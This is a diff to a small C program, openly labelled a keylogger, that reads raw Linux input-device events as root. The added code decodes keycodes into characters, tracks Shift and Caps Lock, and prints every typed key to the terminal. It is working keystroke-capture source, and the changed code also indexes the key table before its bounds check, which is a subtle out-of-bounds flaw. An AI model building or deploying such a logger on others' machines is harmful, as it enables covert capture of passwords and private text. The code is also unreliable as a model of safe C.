@@ -6,6 +6,18 @@
 #include <stdlib.h>
 #include <unistd.h>
 
+char *keys[] = {
+    "",  "ESC", "1", "2",  "3", "4", "5", "6",  "7", "8", "9", "0",
+    "-", "=",   "",  "\t", "q", "w", "e", "r",  "t", "y", "u", "i",
+    "o", "p",   "[", "]",  "",  "",  "a", "s",  "d", "f", "g", "h",
+    "j", "k",   "l", ";",  "'", "",  "",  "\\", "z", "x", "c", "v",
+    "b", "n",   "m", ",",  ".", "/", "",  "",   "",  " ",
+};
+
+char symbols[] = {')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
+
+size_t keys_length = sizeof(keys) / sizeof(keys[0]);
+
 int main(int argc, char *argv[])
 {
     if (argc != 2) {
@@ -22,25 +34,50 @@ int main(int argc, char *argv[])
                 "root)\n");
         exit(-69);
     }
-    printf(
-        "keylogger:\n\tLog: Key logger is active...\n\tLog: Reading from %s\n",
-        argv[1]);
+
+    printf("keylogger:\n\tLog: Key logger is active...\n\tLog: Reading from "
+           "%s...\n\n",
+           argv[1]);
 
     struct input_event ie;
+
+    int is_caps_on = 0;
+    int is_shift_on = 0;
 
     while (1) {
         read(fd, &ie, sizeof(ie));
 
-        int is_1_to_equal = ie.code >= KEY_1 && ie.code <= KEY_EQUAL ? 1 : 0;
-        int is_q_to_rightbrace =
-            ie.code >= KEY_Q && ie.code <= KEY_RIGHTBRACE ? 1 : 0;
-        int is_a_to_apos =
-            ie.code >= KEY_A && ie.code <= KEY_APOSTROPHE ? 1 : 0;
-        int is_z_to_slash = ie.code >= KEY_Z && ie.code <= KEY_SLASH ? 1 : 0;
+        if (ie.type != EV_KEY)
+            continue;
 
-        if (is_1_to_equal || is_q_to_rightbrace || is_a_to_apos ||
-            is_z_to_slash)
-            printf("keylogger:\n\tLog: value: %d\n", ie.code);
+        if (ie.code == KEY_CAPSLOCK && ie.value == 1) {
+            is_caps_on = !is_caps_on;
+        }
+
+        if (ie.code == KEY_LEFTSHIFT || ie.code == KEY_RIGHTSHIFT) {
+            is_shift_on = (ie.value == 1 || ie.value == 2);
+        }
+
+        if (ie.value != 1)
+            continue;
+
+        char *key = keys[ie.code];
+
+        if (ie.code < keys_length && key[0] != '\0') {
+            int is_upper = is_caps_on ^ is_shift_on;
+            int is_alpha = key[0] >= 'a' && key[0] <= 'z';
+            int is_number = key[0] >= '0' && key[0] <= '9';
+
+            if (is_alpha && is_upper) {
+                printf("%c", key[0] - 32);
+            } else if (is_number && is_shift_on) {
+                printf("%c", symbols[atoi(key)]);
+            } else {
+                printf("%s", keys[ie.code]);
+            }
+
+            fflush(stdout);
+        }
     }
 
     return 0;
